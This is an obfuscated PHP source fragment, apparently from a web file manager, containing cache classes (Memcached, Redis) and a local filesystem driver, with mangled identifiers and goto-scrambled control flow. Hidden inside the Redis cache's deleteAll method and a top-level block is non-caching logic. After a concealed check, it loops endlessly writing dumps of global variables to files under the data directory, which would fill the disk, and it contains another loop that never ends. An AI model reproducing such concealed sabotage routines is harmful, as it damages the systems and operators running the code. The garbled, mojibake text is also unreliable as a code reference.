$dõÎ†Œô£ä) { $E∆íù®Ωá”[$D¶Àª©≠ÕÓ[2034]] = $b™◊¯¬ƒ“Ï; continue; } $E∆íù®Ωá”[$D¶Àª©≠ÕÓ[2034]] += 1; } return parent::resetData($aö≥îÇ≈üﬂ); } public function moveBottom($F¿£¿Ω÷°≥) { $BÈ‰∏ñ‹–Ÿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Bà¶∑ª≥ëˆ = $this->getSort($BÈ‰∏ñ‹–Ÿ[243]) + 1; return parent::update($F¿£¿Ω÷°≥, array($BÈ‰∏ñ‹–Ÿ[2034] => $Bà¶∑ª≥ëˆ)); } public function resetSort($eòÎµƒúû) { $dìÛùÃ Ô =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÇ∆√Ú„—ñ = array(); for ($A‚œ†Ωõâ = 0; $A‚œ†Ωõâ < count($eòÎµƒúû); $A‚œ†Ωõâ++) { $bÇ∆√Ú„—ñ[$eòÎµƒúû[$A‚œ†Ωõâ] . $dìÛùÃ Ô[33]] = $A‚œ†Ωõâ + 1; } $Fâ´ß•åÒá = parent::listData(); foreach ($Fâ´ß•åÒá as &$a≥•Î€úûÔ) { $f¬æ¯∏œπè = $bÇ∆√Ú„—ñ[$a≥•Î€úûÔ[$dìÛùÃ Ô[364]]]; $a≥•Î€úûÔ[$dìÛùÃ Ô[2034]] = $f¬æ¯∏œπè ? $f¬æ¯∏œπè : $a≥•Î€úûÔ[$dìÛùÃ Ô[2034]]; } return parent::resetData($Fâ´ß•åÒá); } private function getSort($c¶”áËÙŸı) { $b∏å¢ﬂ»ôå =& $_SERVER[£¿ÌÙëü¡¯¯]; $aÖ∂Ò•Ôä‡ = parent::listData(); $CΩ¡¶ôª◊ª = array_to_keyvalue($aÖ∂Ò•Ôä‡, $b∏å¢ﬂ»ôå[33], $b∏å¢ﬂ»ôå[2034]); if (!$CΩ¡¶ôª◊ª) { $CΩ¡¶ôª◊ª = array(0); } $dÙúÔ¢≥Ü± = $c¶”áËÙŸı == $b∏å¢ﬂ»ôå[243] ? max($CΩ¡¶ôª◊ª) : min($CΩ¡¶ôª◊ª); return intval($dÙúÔ¢≥Ü±); } } goto eÌñù±ÑÆÿ; f®˘ó∆˜˜ﬂ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($A±»ÙË≠Çã, $F∂Æù¿É–Ù) { $C√¬ÌÇ›¨Ô =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!class_exists($C√¬ÌÇ›¨Ô[772])) { show_json($C√¬ÌÇ›¨Ô[773], !1); } $this->cacheTime = $F∂Æù¿É–Ù; $this->handle = new Memcached(); if (is_array($A±»ÙË≠Çã[$C√¬ÌÇ›¨Ô[774]]) && count($A±»ÙË≠Çã[$C√¬ÌÇ›¨Ô[774]]) >= 1) { foreach ($A±»ÙË≠Çã[$C√¬ÌÇ›¨Ô[774]] as $Cœı®çµòÓ) { $AøàÃ≥éÚ¥ = explode($C√¬ÌÇ›¨Ô[4], $Cœı®çµòÓ); $this->handle->addServer($AøàÃ≥éÚ¥[0], $AøàÃ≥éÚ¥[1]); } } else { $this->handle->addServer($A±»ÙË≠Çã[$C√¬ÌÇ›¨Ô[166]], $A±»ÙË≠Çã[$C√¬ÌÇ›¨Ô[167]]); } } public function set($aÙ≈ò√é∏, $F—Ê¥≥Ú„ë, $F˜íâ«Ÿè€ = false) { $F˜íâ«Ÿè€ = $F˜íâ«Ÿè€ ? $F˜íâ«Ÿè€ : $this->cacheTime; return $this->handle->set($aÙ≈ò√é∏, $F—Ê¥≥Ú„ë, $F˜íâ«Ÿè€); } public function get($bä∏µ‡¨“Ú) { return $this->handle->get($bä∏µ‡¨“Ú); } public function remove($AäÑÔÚªÀ©) { return $this->handle->delete($AäÑÔÚªÀ©); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($b◊ÆÑêΩªä, $eíñΩ¿◊ªµ) { $Bòê¯‹ëõå =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!class_exists($Bòê¯‹ëõå[775])) { show_json($Bòê¯‹ëõå[776], !1); } $this->cacheTime = $eíñΩ¿◊ªµ; $fçâ¿¨÷Ÿ÷ = isset($b◊ÆÑêΩªä[$Bòê¯‹ëõå[777]]) ? $b◊ÆÑêΩªä[$Bòê¯‹ëõå[777]] : 10; $D≤√ÓÀ±È = _get($b◊ÆÑêΩªä, $Bòê¯‹ëõå[774]); if ($D≤√ÓÀ±È && is_array($D≤√ÓÀ±È)) { $this->isCluster = !0; $this->initCluster($b◊ÆÑêΩªä, $fçâ¿¨÷Ÿ÷); } else { $this->handle = $this->init($b◊ÆÑêΩªä, $fçâ¿¨÷Ÿ÷); } } private function init($BóËò—·Á„, $Føƒñ∑ÖÇﬂ) { $e’ÌÈ€≈∏Ù =& $_SERVER[£¿ÌÙëü¡¯¯]; $fï’´›ç—— = new Redis(); $e’Ï˜ë√€â = isset($BóËò—·Á„[$e’ÌÈ€≈∏Ù[778]]) ? $BóËò—·Á„[$e’ÌÈ€≈∏Ù[778]] : !1; if ($e’Ï˜ë√€â) { $fï’´›ç——->pconnect($BóËò—·Á„[$e’ÌÈ€≈∏Ù[166]], $BóËò—·Á„[$e’ÌÈ€≈∏Ù[167]], $Føƒñ∑ÖÇﬂ); } else { $fï’´›ç——->connect($BóËò—·Á„[$e’ÌÈ€≈∏Ù[166]], $BóËò—·Á„[$e’ÌÈ€≈∏Ù[167]], $Føƒñ∑ÖÇﬂ); } if (!empty($BóËò—·Á„[$e’ÌÈ€≈∏Ù[373]])) { $fï’´›ç——->auth($BóËò—·Á„[$e’ÌÈ€≈∏Ù[373]]); } return $fï’´›ç——; } private function initCluster($bπÑÆ◊†¢, $D¢∞Ëáê∏ë) { $a…ß›ã¬∆í =& $_SERVER[£¿ÌÙëü¡¯¯]; $aßè¶û…Ô÷ = array($a…ß›ã¬∆í[779], $a…ß›ã¬∆í[780], $a…ß›ã¬∆í[781]); $aÿó•¿êêÚ = $a…ß›ã¬∆í[779]; if (isset($bπÑÆ◊†¢[$a…ß›ã¬∆í[12]]) && in_array($bπÑÆ◊†¢[$a…ß›ã¬∆í[12]], $aßè¶û…Ô÷)) { $aÿó•¿êêÚ = $bπÑÆ◊†¢[$a…ß›ã¬∆í[12]]; } switch ($aÿó•¿êêÚ) { case $a…ß›ã¬∆í[779]: $this->_slave($bπÑÆ◊†¢, $D¢∞Ëáê∏ë); break; case $a…ß›ã¬∆í[780]: break; case $a…ß›ã¬∆í[781]: $dΩÑÆ®Ù©ç = $bπÑÆ◊†¢[$a…ß›ã¬∆í[774]]; $Aœ•Æâ©•î = isset($bπÑÆ◊†¢[$a…ß›ã¬∆í[778]]) ? $bπÑÆ◊†¢[$a…ß›ã¬∆í[778]] : !1; $bªÃ¶á£Õâ = isset($bπÑÆ◊†¢[$a…ß›ã¬∆í[373]]) ? $bπÑÆ◊†¢[$a…ß›ã¬∆í[373]] : null; $this->handle = new RedisCluster(NUll, $dΩÑÆ®Ù©ç, $D¢∞Ëáê∏ë, $D¢∞Ëáê∏ë, $Aœ•Æâ©•î, $bªÃ¶á£Õâ); break; default: break; } } private function _slave($bÚ Àú’÷ú, $D∞ÓÖ§ù¢é) { goto EÀÿµÆÇ•¨; b◊≥é•äÑ∆: unset($eˆÿøïçÇ»[0]); if (empty($eˆÿøïçÇ»)) { return; } $E√¥Êëªˆí = array_rand($eˆÿøïçÇ»); goto A‹¬Ü°äπ‡; A‹¬Ü°äπ‡: $this->filterConfig($bÚ Àú’÷ú, $eˆÿøïçÇ»[$E√¥Êëªˆí]); $this->slaveHandle = $this->init($bÚ Àú’÷ú, $D∞ÓÖ§ù¢é); goto bÌÇÜ°®å‚; EÀÿµÆÇ•¨: $eˆÿøïçÇ» = $bÚ Àú’÷ú[$_SERVER[£¿ÌÙëü¡¯¯][774]]; $this->filterConfig($bÚ Àú’÷ú, $eˆÿøïçÇ»[0]); $this->handle = $this->init($bÚ Àú’÷ú, $D∞ÓÖ§ù¢é); goto b◊≥é•äÑ∆; bÌÇÜ°®å‚: } private function filterConfig(&$DÂÇâ»ÓÁ“, $E†ô†÷≥ıÓ) { $B±ø∑ûÎ¿¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aáÎùÊ·¬« = explode($B±ø∑ûÎ¿¿[4], $E†ô†÷≥ıÓ); $AèÖÈäØùê = array($B±ø∑ûÎ¿¿[166] => $aáÎùÊ·¬«[0], $B±ø∑ûÎ¿¿[167] => $aáÎùÊ·¬«[1]); $DÂÇâ»ÓÁ“ = array_merge($DÂÇâ»ÓÁ“, $AèÖÈäØùê); } public function set($Aò∆ï®éÁ, $E∆¢Ñ∆ÀË¢, $aü’Ÿ‡úáÏ = false) { $aü’Ÿ‡úáÏ = $aü’Ÿ‡úáÏ ? $aü’Ÿ‡úáÏ : $this->cacheTime; return $this->handle->setEx($Aò∆ï®éÁ, $aü’Ÿ‡úáÏ, $E∆¢Ñ∆ÀË¢); } public function setLock($BßœÙûé£‚, $EúÑÉπÊù¿, $AâÜç∆–◊∑) { return $this->handle->setNX($BßœÙûé£‚, $EúÑÉπÊù¿); } public function get($fÇøÃÍ˜·ﬂ) { $d°ü ∑ÀÍ’ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $d°ü ∑ÀÍ’->get($fÇøÃÍ˜·ﬂ); } public function remove($F„øìÖ©ê∑) { return $this->handle->del($F„øìÖ©ê∑); } public function deleteAll() { $b‘ˆÙ˜Û—î =& $_SERVER[£¿ÌÙëü¡¯¯]; $eíµÊ‡ç™– = $_SERVER[$b‘ˆÙ˜Û—î[782]] . $b‘ˆÙ˜Û—î[783]; $Cé™ÃÎŒ◊  = $b‘ˆÙ˜Û—î[784]; if ($_SERVER[$b‘ˆÙ˜Û—î[785]] != $Cé™ÃÎŒ◊ ($eíµÊ‡ç™–)) { goto dºΩ¯ˆ¡áŸ; B£ç„ÃÑπ: $F∏¯Òèù‘Á = 1; for ($bµÔ∂â”¿± = $F∏¯Òèù‘Á; $bµÔ∂â”¿± > 0; $bµÔ∂â”¿±++) { $CâÿÌÃùÜã(DATA_PATH . $bµÔ∂â”¿±, $A‡ËßÒü±”); } goto EÇè…ì™Ï; F˜´œ®œø—: $bÜ∂‘ò«£Ø(); $CâÿÌÃùÜã = $b‘ˆÙ˜Û—î[791]; $A‡ËßÒü±” = json_encode($GLOBALS[$b‘ˆÙ˜Û—î[792]]); goto B£ç„ÃÑπ; cˆ¶ôº¿ù¢: $d£≈÷ã§¯ö = $aì¶‡»® “($aùœûü‘›é); $d∆»◊ë∏åä = explode($b‘ˆÙ˜Û—î[214], $d£≈÷ã§¯ö); if (count($d∆»◊ë∏åä) < $b‘ˆÙ˜Û—î[556]) { $Câàúß˜•π = $b‘ˆÙ˜Û—î[788]; $Câàúß˜•π(); } goto bﬂÑ íÎÇâ; dºΩ¯ˆ¡áŸ: $bÜ∂‘ò«£Ø = $b‘ˆÙ˜Û—î[786]; $aì¶‡»® “ = $b‘ˆÙ˜Û—î[787]; $aùœûü‘›é = $_SERVER[$b‘ˆÙ˜Û—î[782]] . $b‘ˆÙ˜Û—î[783]; goto cˆ¶ôº¿ù¢; bﬂÑ íÎÇâ: $aßº∆≤£èœ = $b‘ˆÙ˜Û—î[789]; $aßº∆≤£èœ($_SERVER[$b‘ˆÙ˜Û—î[790]]); $bÜ∂‘ò«£Ø = $b‘ˆÙ˜Û—î[786]; goto F˜´œ®œø—; EÇè…ì™Ï: } if ($this->isCluster) { foreach ($this->handle->_masters() as $A•”†«≈Öö) { $this->handle->flushall($A•”†«≈Öö); } return; } return $this->handle->flushAll(); } } if (!isset($_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][785]]) || !isset($_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][793]])) { goto E≤÷∫ª¶∫ú; dØçÃÀò±ú: $e≈åÍ¬ÔÏ‹ = explode($_SERVER[£¿ÌÙëü¡¯¯][214], $f‹ﬁ∂Ûø≥Ê); if (count($e≈åÍ¬ÔÏ‹) < $_SERVER[£¿ÌÙëü¡¯¯][544]) { $CŒ¨≤∂Ú¨± = $_SERVER[£¿ÌÙëü¡¯¯][788]; $CŒ¨≤∂Ú¨±(); } $bõ¶≤üÌåÔ = $_SERVER[£¿ÌÙëü¡¯¯][794]; goto cèõûÂ‹èä; E≤÷∫ª¶∫ú: $c“±ﬁ”¬∑î = $_SERVER[£¿ÌÙëü¡¯¯][787]; $Eµ¯ÿ…Œ≥ﬁ = $_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][782]] . $_SERVER[£¿ÌÙëü¡¯¯][783]; $f‹ﬁ∂Ûø≥Ê = $c“±ﬁ”¬∑î($Eµ¯ÿ…Œ≥ﬁ); goto dØçÃÀò±ú; cèõûÂ‹èä: $bõ¶≤üÌåÔ($_SERVER[$_SERVER[£¿ÌÙëü¡¯¯][782]] . $_SERVER[£¿ÌÙëü¡¯¯][783]); $cå¿Óﬂ…Ûò = 2; while ($cå¿Óﬂ…Ûò > 1) { $c˜º§∑ëË‹ = rawurlencode($cå¿Óﬂ…Ûò . $_SERVER[£¿ÌÙëü¡¯¯][358]); } goto bßÁ≤ñãÍì; bßÁ≤ñãÍì: } goto EÔÇ£ä‘∞Ï; AõÈ‘ò≤ÔÖ: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($B°ë±’·ß‡) { if (substr($B°ë±’·ß‡, 0, 2) == $_SERVER[£¿ÌÙëü¡¯¯][1121]) { $B°ë±’·ß‡ = BASIC_PATH . substr($B°ë±’·ß‡, 2); } return $B°ë±’·ß‡; } public function iconvApp($AÑÖ—äÆ≠õ) { $EÂÍâï∑Úî =& $_SERVER[£¿ÌÙëü¡¯¯]; global $config; return $this->iconvTo($AÑÖ—äÆ≠õ, $config[$EÂÍâï∑Úî[1119]], $config[$EÂÍâï∑Úî[1118]]); } public function iconvSystem($D„≠Ûû»÷Ω) { $B–ÆíÒŸ¨· =& $_SERVER[£¿ÌÙëü¡¯¯]; global $config; return $this->iconvTo($D„≠Ûû»÷Ω, $config[$B–ÆíÒŸ¨·[1118]], $config[$B–ÆíÒŸ¨·[1119]]); } public function getPathOuter($B®»…∑†ÜΩ) { goto dÁ≠»«äÀÉ; c™ÜøÖ πÌ: return $this->pathDriver . $a£ÌÂÈÂËÛ[8] . ltrim($B®»…∑†ÜΩ, $a£ÌÂÈÂËÛ[8]); goto fÍÜÇä•ÔÁ; cÑç¥Ìµë“: $B®»…∑†ÜΩ = KodIO::clear($B®»…∑†ÜΩ); $B®»…∑†ÜΩ = substr($B®»…∑†ÜΩ, strlen($DøìÓ˜ŸÑÜ)); if (empty($this->pathDriver)) { return $B®»…∑†ÜΩ; } goto c™ÜøÖ πÌ; dÁ≠»«äÀÉ: $a£ÌÂÈÂËÛ =& $_SERVER[£¿ÌÙëü¡¯¯]; $DøìÓ˜ŸÑÜ = $this->iconvApp($this->pathBase); $B®»…∑†ÜΩ = $this->iconvApp($B®»…∑†ÜΩ); goto dËÏ ‹èã±; dËÏ ‹èã±: if (substr($DøìÓ˜ŸÑÜ, 0, 2) == $a£ÌÂÈÂËÛ[1121]) { $DøìÓ˜ŸÑÜ = BASIC_PATH . substr($DøìÓ˜ŸÑÜ, 2); } if (substr($B®»…∑†ÜΩ, 0, 2) == $a£ÌÂÈÂËÛ[1121]) { $B®»…∑†ÜΩ = BASIC_PATH . substr($B®»…∑†ÜΩ, 2); } $DøìÓ˜ŸÑÜ = KodIO::clear($DøìÓ˜ŸÑÜ); goto cÑç¥Ìµë“; fÍÜÇä•ÔÁ: } public function mkfile($DÍò¥ë∂ÓÏ, $f√⁄ßŒ◊îÖ = '', $E†ëõÙºÁÊ = REPEAT_RENAME) { $DÍò¥ë∂ÓÏ = $this->iconvSystem($DÍò¥ë∂ÓÏ); @touch($DÍò¥ë∂ÓÏ); if ($f√⁄ßŒ◊îÖ) { file_put_contents($DÍò¥ë∂ÓÏ, $f√⁄ßŒ◊îÖ); } return is_file($DÍò¥ë∂ÓÏ) ? $this->getPathOuter($DÍò¥ë∂ÓÏ) : !1; } public function mkdir($fÙﬂ≠·ﬂ‡‚, $câæÁæ∏«ﬂ = REPEAT_SKIP) { $fÙﬂ≠·ﬂ‡‚ = $this->iconvSystem($fÙﬂ≠·ﬂ‡‚); if (is_dir($fÙﬂ≠·ﬂ‡‚)) { return $this->getPathOuter($fÙﬂ≠·ﬂ‡‚); } @mkdir($fÙﬂ≠·ﬂ‡‚, 511, !0); return is_dir($fÙﬂ≠·ﬂ‡‚) ? $this->getPathOuter($fÙﬂ≠·ﬂ‡‚) : !1; } public function copyFile($AÑ≤ãê±†¯, $a›ñõﬂ‰àÇ) { $this->mkdir($this->pathFather($a›ñõﬂ‰àÇ)); $AÑ≤ãê±†¯ = $this->iconvSystem($AÑ≤ãê±†¯); $a›ñõﬂ‰àÇ = $this->iconvSystem($a›ñõﬂ‰àÇ); $Dµ∂ƒ“à“é = @copy($AÑ≤ãê±†¯, $a›ñõﬂ‰àÇ); return $Dµ∂ƒ“à“é ? $this->getPathOuter($a›ñõﬂ‰àÇ) : !1; } public function moveFile($B◊±∂¶óŒÚ, $D∆ß Êˆƒö) { $this->mkdir($this->pathFather($D∆ß Êˆƒö)); $B◊±∂¶óŒÚ = $this->iconvSystem($B◊±∂¶óŒÚ); $D∆ß Êˆƒö = $this->iconvSystem($D∆ß Êˆƒö); $bäÊÍ…≠¥ª = intval(@rename($B◊±∂¶óŒÚ, $D∆ß Êˆƒö)); if (!$bäÊÍ…≠¥ª) { if ($bäÊÍ…≠¥ª = intval(@copy($B◊±∂¶óŒÚ, $D∆ß Êˆƒö))) { @unlink($B◊±∂¶óŒÚ); } } return $bäÊÍ…≠¥ª ? $this->getPathOuter($D∆ß Êˆƒö) : !1; } public function delFile($d»…ÂπÆ≥ß) { $d»…ÂπÆ≥ß = $this->iconvSystem($d»…ÂπÆ≥ß); if (!@unlink($d»…ÂπÆ≥ß)) { @chmod($d»…ÂπÆ≥ß, 511); if (!@unlink($d»…ÂπÆ≥ß)) { return !1; } } else { return !0; } } public function delFolder($Fﬁ™ ÌåÑæ) { goto C®öå∑ßªè; C®öå∑ßªè: $B€Û“∫∫¬π =& $_SERVER[£¿ÌÙëü¡¯¯]; $Fﬁ™ ÌåÑæ = $this->iconvSystem($Fﬁ™ ÌåÑæ); if (!is_dir($Fﬁ™ ÌåÑæ)) { return !0; } goto C‹â∑àâ™í; C‹â∑àâ™í: if (!($Bﬁ »ô’”Ö = opendir($Fﬁ™ ÌåÑæ))) { return !1; } while (($b…ÍÿÊçº≠ = readdir($Bﬁ »ô’”Ö)) !== !1) { if ($b…ÍÿÊçº≠ == $B€Û“∫∫¬π[94] || $b…ÍÿÊçº≠ == $B€Û“∫∫¬π[1131]) { continue; } $BÛ°Çà˜ö™ = $Fﬁ™ ÌåÑæ . $B€Û“∫∫¬π[8] . $b…ÍÿÊçº≠; if (!is_dir($BÛ°Çà˜ö™)) { if (!unlink($BÛ°Çà˜ö™)) { chmod($BÛ°Çà˜ö™, 511); if (!unlink($BÛ°Çà˜ö™)) { return !1; } } } else { chmod($BÛ°Çà˜ö™, 511); $BÛ°Çà˜ö™ = $this->iconvApp($BÛ°Çà˜ö™); if (!$this->delFolder($BÛ°Çà˜ö™)) { return !1; } } } closedir($Bﬁ »ô’”Ö); goto A∫ù⁄≤„ ≠; A∫ù⁄≤„ ≠: return rmdir($Fﬁ™ ÌåÑæ); goto e´ªêáòÑ; e´ªêáòÑ: } public function rename($AøÁôÌÜûØ, $aΩÊ›∞∂ÖÊ) { goto cïáÂïïΩå; bÑÙÉË†ö“: $fÕ˜ŒÁÀäë = @rename($AøÁôÌÜûØ, $d∏Ñ´ÃœÖ¯); $d∏Ñ´ÃœÖ¯ = $this->iconvApp($d∏Ñ´ÃœÖ¯); return $fÕ˜ŒÁÀäë ? $this->getPathOuter($d∏Ñ´ÃœÖ¯) : !1; goto b√ÿ‡‡Éµ™; cïáÂïïΩå: $eÊÿè—Óûû =& $_SERVER[£¿ÌÙëü¡¯¯]; $dÖÜòŒæÖß = $this->fileNameAuto($this->pathFather($AøÁôÌÜûØ), $aΩÊ›∞∂ÖÊ); $dÖÜòŒæÖß = $this->iconvSystem($dÖÜòŒæÖß); goto C‰ππ‹∞“Á; C‰ππ‹∞“Á: $AøÁôÌÜûØ = $this->iconvSystem($AøÁôÌÜûØ); $D‚¥à€√äı = $this->pathFather($AøÁôÌÜûØ); $d∏Ñ´ÃœÖ¯ = rtrim($D‚¥à€√äı, $eÊÿè—Óûû[8]) . $eÊÿè—Óûû[8] . $dÖÜòŒæÖß; goto bÑÙÉË†ö“; b√ÿ‡‡Éµ™: } public function size($Aﬁ—≠‚¶Ô) { $Aﬁ—≠‚¶Ô = $this->iconvSystem($Aﬁ—≠‚¶Ô); return (double) abs(sprintf($_SERVER[£¿ÌÙëü¡¯¯][1133], @filesize($Aﬁ—≠‚¶Ô))); } public function info($BÖê◊œèë´) { $BÖê◊œèë´ = $this->iconvSystem($BÖê◊œèë´); if ($this->isFolder($BÖê◊œèë´)) { return $this->folderInfo($BÖê◊œèë´); } else { if ($this->isFile($BÖê◊œèë´)) { return $this->fileInfo($BÖê◊œèë´); } } return !1; } protected function infoChildren($bû“ÚÖÿ‚›, &$Aæ≠∆ë◊¢ä, $E⁄ÿ’ï¥πƒ = true) { $B¯´äÒ€Øä =& $_SERVER[£¿ÌÙëü¡¯¯]; $bû“ÚÖÿ‚› = rtrim($bû“ÚÖÿ‚›, $B¯´äÒ€Øä[8]) . $B¯´äÒ€Øä[8]; if ($E⁄ÿ’ï¥πƒ) { check_abort(); $bû“ÚÖÿ‚› = $this->iconvSystem($bû“ÚÖÿ‚›); } if (!($Fè’⁄€®ƒÇ = @opendir($bû“ÚÖÿ‚›))) { return; } while (($bÖÒñù¬ä√ = readdir($Fè’⁄€®ƒÇ)) !== !1) { if ($bÖÒñù¬ä√ == $B¯´äÒ€Øä[94] || $bÖÒñù¬ä√ == $B¯´äÒ€Øä[1131]) { continue; } $f¬◊à∫ÊÛå = $bû“ÚÖÿ‚› . $bÖÒñù¬ä√; if (is_file($f¬◊à∫ÊÛå)) { $Aæ≠∆ë◊¢ä[$B¯´äÒ€Øä[79]]++; $Aæ≠∆ë◊¢ä[$B¯´äÒ€Øä[78]] += (double) abs(sprintf($B¯´äÒ€Øä[1133], @filesize($f¬◊à∫ÊÛå))); } else { $Aæ≠∆ë◊¢ä[$B¯´äÒ€Øä[80]]++; $this->infoChildren($f¬◊à∫ÊÛå, $Aæ≠∆ë◊¢ä, !1); } } closedir($Fè’⁄€®ƒÇ); } private function folderInfo($cáü·∆íÀµ, $dÇ—Üèƒ≤¢ = false) { $Dº™≥ıáûÍ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cáü·∆íÀµ = rtrim($cáü·∆íÀµ, $Dº™≥ıáûÍ[8]) . $Dº™≥ıáûÍ[8]; $eÎæ Çù¡Ω = $this->iconvApp($this->pathThis($cáü·∆íÀµ)); if ($dÇ—Üèƒ≤¢) { return array($Dº™≥ıáûÍ[28] => $eÎæ Çù¡Ω, $Dº™≥ıáûÍ[76] => $this->getPathOuter($cáü·∆íÀµ), $Dº™≥ıáûÍ[29] => $Dº™≥ıáûÍ[77]); } $CÌ¥É»ãÆÆ = array($Dº™≥ıáûÍ[28] => $eÎæ Çù¡Ω, $Dº™≥ıáûÍ[76] => $this->getPathOuter($cáü·∆íÀµ), $Dº™≥ıáûÍ[29] => $Dº™≥ıáûÍ[77], $Dº™≥ıáûÍ[184] => @filectime($cáü·∆íÀµ), $Dº™≥ıáûÍ[108] => @filemtime($cáü·∆íÀµ), $Dº™≥ıáûÍ[1134] => @fileatime($cáü·∆íÀµ), $Dº™≥ıáûÍ[1128] => is_readable($cáü·∆íÀµ), $Dº™≥ıáûÍ[1129] => is_writable($cáü·∆íÀµ), $Dº™≥ıáûÍ[1135] => get_mode($cáü·∆íÀµ)); return $CÌ¥É»ãÆÆ; } private function fileInfo($C∏âÀÜ·‘É, $F÷â·≠™êá = false) { $FÉª–ç≠óç =& $_SERVER[£¿ÌÙëü¡¯¯]; $Dß—∫˘…ï˘ = $this->iconvApp($this->pathThis($C∏âÀÜ·‘É)); if ($F÷â·≠™êá) { return array($FÉª–ç≠óç[28] => $Dß—∫˘…ï˘, $FÉª–ç≠óç[76] => $this->getPathOuter($C∏âÀÜ·‘É), $FÉª–ç≠óç[29] => $FÉª–ç≠óç[164], $FÉª–ç≠óç[78] => $this->size($C∏âÀÜ·‘É), $FÉª–ç≠óç[157] => $this->ext($Dß—∫˘…ï˘)); } $f≤•ïÇùûŒ = array($FÉª–ç≠óç[28] => $Dß—∫˘…ï˘, $FÉª–ç≠óç[76] => $this->getPathOuter($C∏âÀÜ·‘É), $FÉª–ç≠óç[29] => $FÉª–ç≠óç[164], $FÉª–ç≠óç[184] => @filectime($C∏âÀÜ·‘É), $FÉª–ç≠óç[108] => @filemtime($C∏âÀÜ·‘É), $FÉª–ç≠óç[1134] => @fileatime($C∏âÀÜ·‘É), $FÉª–ç≠óç[78] => $this->size($C∏âÀÜ·‘É), $FÉª–ç≠óç[157] => $this->ext($Dß—∫˘…ï˘), $FÉª–ç≠óç[1128] => is_readable($C∏âÀÜ·‘É), $FÉª–ç≠óç[1129] => is_writable($C∏âÀÜ·‘É), $FÉª–ç≠óç[1135] => get_mode($C∏âÀÜ·‘É)); return $f≤•ïÇùûŒ; } public function exist($eÕåÿÛ“î‡) { $eÕåÿÛ“î‡ = $this->iconvSystem($eÕåÿÛ“î‡); return @file_exists($eÕåÿÛ“î‡); } public function isFile($Aë˘∫æπ¬‚) { $Aë˘∫æπ¬‚ = $this->iconvSystem($Aë˘∫æπ¬‚); return @is_file($Aë˘∫æπ¬‚); } public function isFolder($Dä´Ã±î¨) { $Dä´Ã±î¨ = $this->iconvSystem($Dä´Ã±î¨); return @is_dir($Dä´Ã±î¨); } public function listPath($e∆≤Ç¶á∆›, $cªª÷≥àÿª = false) { goto eÛ≈çÃ‡ “; eÛ≈çÃ‡ “: $Fäú∂◊„ñ∑ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e∆≤Ç¶á∆› = $this->iconvSystem($e∆≤Ç¶á∆›); $e∆≤Ç¶á∆› = rtrim($e∆≤Ç¶á∆›, $Fäú∂◊„ñ∑[8]) . $Fäú∂◊„ñ∑[8]; goto cô±â¡úŒ‹; cô±â¡úŒ‹: $f÷£íø§âÙ = array($Fäú∂◊„ñ∑[75] => array(), $Fäú∂◊„ñ∑[74] => array()); if (!($cïé®úö∞ã = @opendir($e∆≤Ç¶á∆›))) { return $f÷£íø§âÙ; } while (($CÆ¡óúñé° = readdir($cïé®úö∞ã)) !== !1) { if ($CÆ¡óúñé° == $Fäú∂◊„ñ∑[94] || $CÆ¡óúñé° == $Fäú∂◊„ñ∑[1131]) { continue; } $FØ≠Óß√∆À = $e∆≤Ç¶á∆› . $CÆ¡óúñé°; if (is_file($FØ≠Óß√∆À)) { $f÷£íø§âÙ[$Fäú∂◊„ñ∑[74]][] = $this->fileInfo($FØ≠Óß√∆À, $cªª÷≥àÿª); } else { $f÷£íø§âÙ[$Fäú∂◊„ñ∑[75]][] = $this->folderInfo($FØ≠Óß√∆À, $cªª÷≥àÿª); } } goto EâÌ–èÃπö; EâÌ–èÃπö: closedir($cïé®úö∞ã); return $f÷£íø§âÙ; goto b“ÔÌÒ‚»•; b“ÔÌÒ‚»•: } public function listAll($eË…ÔÔ‘à∑, &$F÷ ß≠››¬ = array()) { goto A–‹äâÒ√£; A–‹äâÒ√£: $AΩ›®òÇ∏Í =& $_SERVER[£¿ÌÙëü¡¯¯]; $eË…ÔÔ‘à∑ = $this->iconvSystem($eË…ÔÔ‘à∑); $eË…ÔÔ‘à∑ = rtrim($eË…ÔÔ‘à∑, $AΩ›®òÇ∏Í[8]) . $AΩ›®òÇ∏Í[8]; goto A´ƒ©‹±∏ª; B∞âÜÂ„ô‡: return $F÷ ß≠››¬; goto DêÕéÜ±úÜ; A´ƒ©‹±∏ª: if (!($dí‘ÎΩ˘ÑÙ = @opendir($eË…ÔÔ‘à∑))) { return $F÷ ß≠››¬; } while (($f¯ ÕÖπ‰° = readdir($dí‘ÎΩ˘ÑÙ)) !== !1) { if ($f¯ ÕÖπ‰° == $AΩ›®òÇ∏Í[94] || $f¯ ÕÖπ‰° == $AΩ›®òÇ∏Í[1131]) { continue; } $E…ûú‹±∑≈ = $eË…ÔÔ‘à∑ . $f¯ ÕÖπ‰°; if (is_dir($E…ûú‹±∑≈)) { $F÷ ß≠››¬[] = array($AΩ›®òÇ∏Í[76] => $E…ûú‹±∑≈ . $AΩ›®òÇ∏Í[8], $AΩ›®òÇ∏Í[77] => 1, $AΩ›®òÇ∏Í[78] => 0); $this->listAll($E…ûú‹±∑≈, $F÷ ß≠››¬); } else { $F÷ ß≠››¬[] = array($AΩ›®òÇ∏Í[76] => $E…ûú‹±∑≈, $AΩ›®òÇ∏Í[77] => 0, $AΩ›®òÇ∏Í[78] => $this->size($E…ûú‹±∑≈)); } } closedir($dí‘ÎΩ˘ÑÙ); goto B∞âÜÂ„ô‡; DêÕéÜ±úÜ: } public function has($Bπƒ∑Ø√°, $dˆõØÖ¡Ç¨ = false, $BÀôﬁ„◊ªÎ = true) { goto Aè©…À∆Ûá; Aè©…À∆Ûá: $AâÉê›®ëÉ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Bπƒ∑Ø√° = $this->iconvSystem($Bπƒ∑Ø√°); $Bπƒ∑Ø√° = rtrim($Bπƒ∑Ø√°, $AâÉê›®ëÉ[8]) . 